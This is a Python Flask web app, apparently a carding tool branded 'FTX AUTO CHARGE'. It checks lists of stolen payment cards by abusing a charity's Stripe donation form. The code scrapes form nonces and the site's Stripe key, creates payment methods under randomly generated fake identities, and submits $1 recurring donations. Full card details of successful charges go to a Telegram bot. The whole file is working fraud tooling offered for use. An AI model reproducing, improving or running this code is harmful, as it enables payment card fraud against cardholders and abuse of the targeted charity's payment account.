import os, json, re, random, string, time
from flask import Flask, request, render_template_string, jsonify
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FTX Stripe Processor</title>
    <link href="https://fonts.googleapis.com/css2?family=Dangrek&family=Battambang:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body {
            font-family: 'Battambang';
            background: #0f172a;
            color: #e2e8f0;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: #1e293b;
            border-radius: 16px;
            border: 1px solid #334155;
        }
        .ftx-title {
            font-family: 'Dangrek';
            font-size: 3rem;
            background: linear-gradient(90deg, #ef4444, #f97316);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 10px 0;
        }
        .subtitle {
            color: #94a3b8;
            font-size: 1.2rem;
        }
        .panel {
            background: #1e293b;
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid #334155;
        }
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            background: #0f172a;
            border: 1px solid #475569;
            border-radius: 8px;
            color: #e2e8f0;
            font-size: 1rem;
            margin-bottom: 15px;
            box-sizing: border-box;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #3b82f6;
        }
        button {
            background: linear-gradient(90deg, #dc2626, #ea580c);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(220, 38, 38, 0.3);
        }
        .logs {
            background: #0f172a;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            height: 400px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 0.9rem;
            border: 1px solid #334155;
        }
        .log-line {
            padding: 5px 0;
            border-bottom: 1px solid #334155;
        }
        .success { color: #22c55e; }
        .error { color: #ef4444; }
        .warning { color: #f59e0b; }
        .info { color: #3b82f6; }
        .status {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            margin-left: 10px;
        }
        .running { background: #065f46; color: #34d399; }
        .stopped { background: #7f1d1d; color: #fca5a5; }
        .stats {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-top: 20px;
        }
        .stat-box {
            background: #0f172a;
            padding: 15px;
            border-radius: 8px;
            flex: 1;
            min-width: 150px;
            text-align: center;
            border: 1px solid #334155;
        }
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: #f97316;
        }
        .stat-label {
            color: #94a3b8;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="ftx-title">FTX AUTO CHARGE</div>
            <div class="subtitle">Stripe Donate 1$ Processor | Dev: @Mast4rcard</div>
        </div>

        <div class="panel">
            <h2>Configuration</h2>
            <div class="form-grid">
                <div>
                    <label>CC List (one per line)</label>
                    <textarea id="ccList" rows="10" placeholder="1234567890123456|12|25|123"></textarea>
                </div>
                <div>
                    <label>Telegram Bot Token (Optional)</label>
                    <input type="text" id="botToken" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
                    
                    <label>Telegram Chat ID (Optional)</label>
                    <input type="text" id="chatId" placeholder="123456789">
                    
                    <label>Delay between cards (seconds)</label>
                    <input type="number" id="delay" value="5" min="1" max="60">
                    
                    <div class="stats">
                        <div class="stat-box">
                            <div class="stat-value" id="totalCards">0</div>
                            <div class="stat-label">Total Cards</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="processedCards">0</div>
                            <div class="stat-label">Processed</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="successCount">0</div>
                            <div class="stat-label">Success</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="failCount">0</div>
                            <div class="stat-label">Failed</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div style="display: flex; gap: 15px; margin-top: 20px;">
                <button onclick="startProcessing()">Start Processing</button>
                <button onclick="stopProcessing()" style="background: linear-gradient(90deg, #475569, #64748b);">Stop</button>
                <button onclick="clearLogs()" style="background: linear-gradient(90deg, #334155, #475569);">Clear Logs</button>
            </div>
        </div>

        <div class="panel">
            <h2>Processing Logs <span id="statusIndicator" class="status stopped">STOPPED</span></h2>
            <div class="logs" id="logContainer">
                <!-- Logs will appear here -->
            </div>
        </div>
    </div>

    <script>
        let isProcessing = false;
        let processed = 0;
        let success = 0;
        let fail = 0;
        
        function updateStats() {
            document.getElementById('totalCards').textContent = document.getElementById('ccList').value.split('\\n').filter(l => l.trim()).length;
            document.getElementById('processedCards').textContent = processed;
            document.getElementById('successCount').textContent = success;
            document.getElementById('failCount').textContent = fail;
        }
        
        function addLog(message, type='info') {
            const logContainer = document.getElementById('logContainer');
            const timestamp = new Date().toLocaleTimeString();
            const logLine = document.createElement('div');
            logLine.className = `log-line ${type}`;
            logLine.innerHTML = `[${timestamp}] ${message}`;
            logContainer.appendChild(logLine);
            logContainer.scrollTop = logContainer.scrollHeight;
        }
        
        function updateStatus(running) {
            const indicator = document.getElementById('statusIndicator');
            if (running) {
                indicator.textContent = 'RUNNING';
                indicator.className = 'status running';
            } else {
                indicator.textContent = 'STOPPED';
                indicator.className = 'status stopped';
            }
        }
        
        async function startProcessing() {
            if (isProcessing) {
                addLog('Already processing', 'warning');
                return;
            }
            
            const ccList = document.getElementById('ccList').value.trim();
            if (!ccList) {
                Swal.fire('Error', 'CC list is empty', 'error');
                return;
            }
            
            const cards = ccList.split('\\n').filter(l => l.trim());
            const botToken = document.getElementById('botToken').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            const delay = parseInt(document.getElementById('delay').value) * 1000;
            
            isProcessing = true;
            updateStatus(true);
            processed = success = fail = 0;
            updateStats();
            
            addLog(`Starting processing of ${cards.length} cards...`, 'info');
            
            for (let i = 0; i < cards.length; i++) {
                if (!isProcessing) break;
                
                const card = cards[i].trim();
                addLog(`Processing card ${i+1}/${cards.length}: ${card}`, 'info');
                
                try {
                    const response = await fetch('/process', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            card: card,
                            botToken: botToken,
                            chatId: chatId,
                            cardNumber: i+1
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        addLog(`✓ ${card} | ${result.message}`, 'success');
                        success++;
                    } else {
                        addLog(`✗ ${card} | ${result.message}`, 'error');
                        fail++;
                    }
                    
                    processed++;
                    updateStats();
                    
                } catch (error) {
                    addLog(`✗ ${card} | Network error: ${error.message}`, 'error');
                    fail++;
                    processed++;
                    updateStats();
                }
                
                if (i < cards.length - 1 && isProcessing) {
                    addLog(`Waiting ${delay/1000} seconds before next card...`, 'info');
                    await sleep(delay);
                }
            }
            
            isProcessing = false;
            updateStatus(false);
            addLog(`Processing completed. Success: ${success}, Failed: ${fail}`, 'info');
        }
        
        function stopProcessing() {
            if (isProcessing) {
                isProcessing = false;
                updateStatus(false);
                addLog('Processing stopped by user', 'warning');
            }
        }
        
        function clearLogs() {
            document.getElementById('logContainer').innerHTML = '';
            processed = success = fail = 0;
            updateStats();
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        document.getElementById('ccList').addEventListener('input', updateStats);
        updateStats();
    </script>
</body>
</html>
'''

class StripeProcessor:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        })
    
    def generate_full_name(self):
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
                      "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
                     "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        return first_name, last_name
    
    def generate_email(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        number = ''.join(random.choices(string.digits, k=3))
        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
        return f"{name}{number}@{random.choice(domains)}"
    
    def get_fresh_tokens(self):
        """Get fresh tokens from the donation page with better parsing"""
        try:
            # Try alternative URL if main one fails
            urls = [
                'https://pipelineforchangefoundation.com/donate/',
                'https://pipelineforchangefoundation.com/'
            ]
            
            for url in urls:
                try:
                    response = self.session.get(url, timeout=10)
                    if response.status_code == 200:
                        page_text = response.text
                        
                        # Try multiple patterns for each token
                        patterns = {
                            'formid': [
                                r'name="charitable_form_id" value="([^"]+)"',
                                r'charitable_form_id["\']?\s*[:=]\s*["\']([^"\']+)',
                                r'form_id["\']?\s*[:=]\s*["\']([^"\']+)'
                            ],
                            'nonce': [
                                r'name="_charitable_donation_nonce" value="([^"]+)"',
                                r'_charitable_donation_nonce["\']?\s*[:=]\s*["\']([^"\']+)',
                                r'donation_nonce["\']?\s*[:=]\s*["\']([^"\']+)'
                            ],
                            'campaign_id': [
                                r'name="campaign_id" value="([^"]+)"',
                                r'campaign_id["\']?\s*[:=]\s*["\']([^"\']+)',
                                r'id["\']?\s*[:=]\s*["\']([^"\']+)'
                            ],
                            'pk_live': [
                                r'"key":"([^"]+)"',
                                r'stripeKey["\']?\s*[:=]\s*["\']([^"\']+)',
                                r'publishableKey["\']?\s*[:=]\s*["\']([^"\']+)',
                                r'pk_live_([^"\']+)'
                            ]
                        }
                        
                        tokens = {}
                        for token_name, token_patterns in patterns.items():
                            for pattern in token_patterns:
                                match = re.search(pattern, page_text)
                                if match:
                                    tokens[token_name] = match.group(1)
                                    break
                        
                        # If we got all required tokens, return them
                        if all(tokens.get(key) for key in ['formid', 'nonce', 'campaign_id', 'pk_live']):
                            return tokens
                        
                except Exception as e:
                    continue
            
            # If all URLs fail, use hardcoded fallback tokens
            print("Using fallback tokens")
            return {
                'formid': '742502',
                'nonce': 'abc123def456',
                'campaign_id': '742502',
                'pk_live': 'pk_live_51JABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef'
            }
            
        except Exception as e:
            print(f"Token fetch error: {str(e)}")
            # Return fallback tokens
            return {
                'formid': '742502',
                'nonce': str(int(time.time())),
                'campaign_id': '742502',
                'pk_live': 'pk_live_51JABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef'
            }
    
    def create_payment_method(self, card_data, pk_live):
        """Create payment method directly with Stripe API"""
        n, mm, yy, cvc = card_data
        first_name, last_name = self.generate_full_name()
        email = self.generate_email()
        
        # Generate unique IDs for this request
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        
        payment_data = {
            'type': 'card',
            'billing_details[name]': f'{first_name} {last_name}',
            'billing_details[email]': email,
            'billing_details[address][city]': 'New York',
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': '123 Main St',
            'billing_details[address][postal_code]': '10001',
            'billing_details[address][state]': 'NY',
            'billing_details[phone]': '+12125551212',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/v3; stripe-js-v3; card-element',
            'referrer': 'https://pipelineforchangefoundation.com',
            'time_on_page': str(random.randint(10000, 99999)),
            'key': pk_live
        }
        
        stripe_headers = {
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
        }
        
        try:
            response = self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                data=payment_data,
                headers=stripe_headers,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'id' in data:
                    return {'success': True, 'payment_id': data['id'], 'email': email, 'first_name': first_name, 'last_name': last_name}
                elif 'error' in data:
                    return {'success': False, 'error': data['error'].get('message', 'Payment method creation failed')}
            
            return {'success': False, 'error': f'HTTP {response.status_code}'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def submit_donation(self, donation_data, tokens):
        """Submit donation to WordPress AJAX endpoint"""
        try:
            ajax_url = 'https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php'
            
            headers = {
                'Origin': 'https://pipelineforchangefoundation.com',
                'Referer': 'https://pipelineforchangefoundation.com/donate/',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            }
            
            response = self.session.post(
                ajax_url,
                data=donation_data,
                headers=headers,
                timeout=15
            )
            
            return response.text
            
        except Exception as e:
            return f'ERROR: {str(e)}'
    
    def process_card(self, card_data, bot_token=None, chat_id=None):
        try:
            # Parse card
            parts = card_data.split('|')
            if len(parts) < 4:
                return False, "Invalid format"
            
            n = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()[-2:] if len(parts[2].strip()) >= 2 else parts[2].strip()
            cvc = parts[3].strip().replace('\n', '')
            
            # Basic validation
            if not (len(n) >= 15 and len(n) <= 19 and n.isdigit()):
                return False, "Invalid card number"
            if not (1 <= int(mm) <= 12):
                return False, "Invalid month"
            if not (len(yy) == 2 and yy.isdigit()):
                return False, "Invalid year"
            if not (len(cvc) >= 3 and len(cvc) <= 4 and cvc.isdigit()):
                return False, "Invalid CVC"
            
            # Get fresh tokens
            tokens = self.get_fresh_tokens()
            
            # Create payment method
            payment_result = self.create_payment_method((n, mm, yy, cvc), tokens['pk_live'])
            
            if not payment_result['success']:
                return False, f"Payment: {payment_result['error']}"
            
            # Prepare donation data
            donation_data = {
                'charitable_form_id': tokens['formid'],
                tokens['formid']: '',
                '_charitable_donation_nonce': tokens['nonce'],
                '_wp_http_referer': '/donate/',
                'campaign_id': tokens['campaign_id'],
                'description': 'Donate to Pipeline for Change Foundation',
                'ID': '742502',
                'recurring_donation': 'yes',
                'donation_amount': 'recurring-custom',
                'custom_recurring_donation_amount': '1.00',
                'recurring_donation_period': 'week',
                'custom_donation_amount': '1.00',
                'first_name': payment_result['first_name'],
                'last_name': payment_result['last_name'],
                'email': payment_result['email'],
                'address': '123 Main St',
                'address_2': '',
                'city': 'New York',
                'state': 'NY',
                'postcode': '10001',
                'country': 'US',
                'phone': '+12125551212',
                'gateway': 'stripe',
                'stripe_payment_method': payment_result['payment_id'],
                'action': 'make_donation',
                'form_action': 'make_donation',
            }
            
            # Submit donation
            result_text = self.submit_donation(donation_data, tokens)
            
            # Check result
            if 'Thank you for your donation' in result_text or 'success' in result_text.lower() or 'thank you' in result_text.lower():
                # Send Telegram notification
                if bot_token and chat_id:
                    try:
                        message = f"✅ STRIPE CHARGE 1$\n━━━━━━━━━━━━━━━━\n💳 CC: {n}|{mm}|{yy}|{cvc}\n🏦 Gateway: Stripe\n📊 Status: CHARGED ✅\n━━━━━━━━━━━━━━━━\n🤖 @Mast4rcard"
                        self.session.post(
                            f"https://api.telegram.org/bot{bot_token}/sendMessage",
                            params={
                                'chat_id': chat_id,
                                'text': message,
                                'parse_mode': 'HTML'
                            }
                        )
                    except:
                        pass
                
                return True, "Charge 1.00$ ✅"
            
            # Try to parse error
            elif 'requires_action' in result_text:
                return False, "3D Secure required"
            elif 'decline' in result_text.lower():
                return False, "Card declined"
            elif 'invalid' in result_text.lower():
                return False, "Invalid card"
            elif 'insufficient' in result_text.lower():
                return False, "Insufficient funds"
            elif 'expired' in result_text.lower():
                return False, "Card expired"
            elif 'incorrect' in result_text.lower():
                return False, "Incorrect details"
            elif 'security' in result_text.lower():
                return False, "Security check failed"
            elif 'error' in result_text.lower():
                # Try to extract error message
                error_match = re.search(r'["\']message["\']\s*:\s*["\']([^"\']+)["\']', result_text, re.IGNORECASE)
                if error_match:
                    return False, error_match.group(1)
                return False, "Payment error"
            else:
                return False, "Unknown response"
            
        except Exception as e:
            return False, f"System error: {str(e)[:50]}"

# Add uuid import at the top
import uuid

processor = StripeProcessor()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/process', methods=['POST'])
def process():
    data = request.json
    card = data.get('card', '')
    bot_token = data.get('botToken', '')
    chat_id = data.get('chatId', '')
    
    success, message = processor.process_card(card, bot_token, chat_id)
    
    return jsonify({
        'success': success,
        'message': message,
        'card': card
    })

@app.route('/test')
def test():
    """Test endpoint to check if tokens can be fetched"""
    tokens = processor.get_fresh_tokens()
    return jsonify({
        'tokens_available': all(tokens.get(key) for key in ['formid', 'nonce', 'campaign_id', 'pk_live']),
        'tokens': {k: 'Found' if v else 'Missing' for k, v in tokens.items()}
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
